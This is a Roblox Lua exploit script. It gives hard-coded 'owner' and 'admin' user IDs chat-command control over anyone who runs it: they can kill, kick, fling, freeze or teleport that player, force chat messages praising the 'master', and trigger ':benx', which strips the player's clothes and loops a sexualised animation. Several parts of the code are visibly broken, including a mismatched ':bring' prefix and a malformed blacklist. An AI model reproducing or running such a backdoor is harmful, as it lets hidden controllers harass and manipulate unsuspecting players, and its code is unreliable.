local whitelist = { owner = { 729854877, 2067354600 }, admin = { 2598041621 },}

owner = false admin = false

local function runcommand(message,author) owner = false admin = false local player = game.Players[author] for i ,_ in pairs(whitelist.admin) do if player.UserId == _ then admin = true end
end for i ,_ in pairs(whitelist.owner) do if player.UserId == _ then owner = true end
end

if admin or owner then
	if message:sub(1, 8) == ":bring" then
		if message:match(game.Players.LocalPlayer.Name) then
			local plr = game.Players.LocalPlayer
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[author].Character.Head.CFrame
		end
	end
	-- kill start
	if message:sub(1, 5) == ":kill" then
		if message:match(game.Players.LocalPlayer.Name) then
			local plr = game.Players.LocalPlayer
			game.Players.LocalPlayer.Character.Humanoid.Health = 0
		end
	end
	--  kill end
	-- kick start
	if message:sub(1, 5) == ":kick" then
		if message:match(game.Players.LocalPlayer.Name) then
			local plr = game.Players.LocalPlayer
			game.Players.LocalPlayer:Kick("\nxd u was kicked by who though?. \n["..author.."]")

		end
	end
	
	if message:sub(1, 7) == ":freeze" then
		if message:match(game.Players.LocalPlayer.Name) then
			game.Players.LocalPlayer.Character.Head.Anchored = true
		end
	end
	
	if message:sub(1, 9) == ":unfreeze" then
		if message:match(game.Players.LocalPlayer.Name) then
			game.Players.LocalPlayer.Character.Head.Anchored = false
		end
	end
	
	if message:sub(1, 5) == ":benx" then
		if message:match(game.Players.LocalPlayer.Name) then
			bending = true
			local segtarget = author.Name
			local Crouch = player.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(game:GetService("ReplicatedStorage").ClientAnimations.Crouching)
			Crouch.Looped = true
			Crouch:Play()
			local away = .5
			local reversing = false
			local shirt = player.Character:FindFirstChild('Shirt')
			local pants = player.Character:FindFirstChild('Pants')
			if shirt then
				shirt:Destroy()
			end
			if pants then
				pants:Destroy()
			end
			local Loop
			local loopFunction = function()
				local targetchar = game.Workspace.Players:FindFirstChild(segtarget) or game.Workspace:FindFirstChild(segtarget)
				local character = player.Character
				if targetchar then
					if reversing == true then
						away = away - 0.1
					else
						away = away + 0.1
					end
					if away >= 2 then
						reversing = true
					elseif away < 0.5 then
						reversing = false
					end
					character.HumanoidRootPart.CFrame = game.Players[segtarget].Character.HumanoidRootPart.CFrame + game.Players[segtarget].Character.HumanoidRootPart.CFrame.lookVector * away
				end
			end;
			local Start = function()
				Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
			end;
			local Pause = function()
				Loop:Disconnect()
				Crouch:Stop()
			end;
			Start()	
			repeat wait() until bending == false
			Pause()
		end
	end
	
	if message:sub(1, 7) == ":unbenx" then
		if message:match(game.Players.LocalPlayer.Name) then
			while bending == true do
				wait()
				bending = false
			end
		end
	end
	
	if message:sub(1, 6) == ":fling" then
		if message:match(game.Players.LocalPlayer.Name) then
			local plr = game.Players.LocalPlayer
			plr.Character.HumanoidRootPart.Velocity = Vector3.new(500000,500000,500000)
		end
	end

	-- kick end
	if message == ":bind" then
		if author ~= game.Players.LocalPlayer.Name then
			local path = game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest
			path:FireServer("Praise, for the master "..author.."!","all")
		end
	end

	if owner then
		if message:sub(1, 4) == ":ban" then
			if message:match(game.Players.LocalPlayer.Name) then
				game.ReplicatedStorage.MainEvent:FireServer("BreathingHAMON")
				local TeleportService = game:GetService("TeleportService")
				TeleportService:Teleport(2788229376, game.Players.LocalPlayer)
			end
		end
		
		if owner then
			if message:sub(1, 10) == ":blacklist" then
				local blacklisted = {
					{
						UserId  = 0,
						Reason = "A booster has blacklisted you."
					}
				}
				if message:match(game.Players.LocalPlayer.UserID) then
					local plrID = game:GetService('Players'):FindFirstChild(game.Players.Name).UserId

						for i,_ in pairs(blacklisted) do
							if table.find(blacklisted[i]["UserId"], player.UserId) then
								player:Kick("You are blacklisted from this script for the reason: "..blacklisted[i["Reason"]])
							end
						end
								if message:sub(1, 12) == ":unblacklist" then
									if message:match(game.Players.LocalPlayer.UserID) then
										table.remove(blacklisted, plrID)
									end
								end
							end
				end
		end	

		if message:sub(1, 7) == ":rejoin" then
			if message:match(game.Players.LocalPlayer.Name) then
				local TeleportService = game:GetService("TeleportService")
				TeleportService:Teleport(2788229376, game.Players.LocalPlayer)
			end
		end
	end
end
end

-- //
for i,v in pairs(game.Players:GetChildren()) do for i ,_ in pairs(whitelist.admin) do if v.UserId == _ then admin = true if admin then warn('New admin : '..v.Name) v.Chatted:Connect(function(msg) print(v.Name.. " said "..msg) runcommand(msg,v.Name) end) end end end
end game.Players.PlayerAdded:Connect(function(player) for i ,_ in pairs(whitelist.admin) do if player.UserId == _ then admin = true if admin then warn('New admin : '..player.Name) player.Chatted:Connect(function(msg) runcommand(msg,player.Name) end) end end end
end)

if admin == true then setclipboard('test') game.StarterGui:SetCore("SendNotification", { Title = "Mod Prems Loaded"; Text = "Criedts: Zeyy"; Duration = 15; }) elseif owner then setclipboard('test') game.StarterGui:SetCore("SendNotification", { Title = "Mod Prems Loaded"; Text = "Criedts: Zeyy"; Duration = 15; }) end

-- // Owner

for i,v in pairs(game.Players:GetChildren()) do for i ,_ in pairs(whitelist.owner) do if v.UserId == _ then owner = true if owner then warn('New owner : '..v.Name) v.Chatted:Connect(function(msg) print(v.Name.. " said "..msg) runcommand(msg,v.Name) end) end end end
end game.Players.PlayerAdded:Connect(function(player) for i ,_ in pairs(whitelist.owner) do if player.UserId == _ then owner = true if owner then warn('New owner : '..player.Name) player.Chatted:Connect(function(msg) runcommand(msg,player.Name) end) end end end
end)
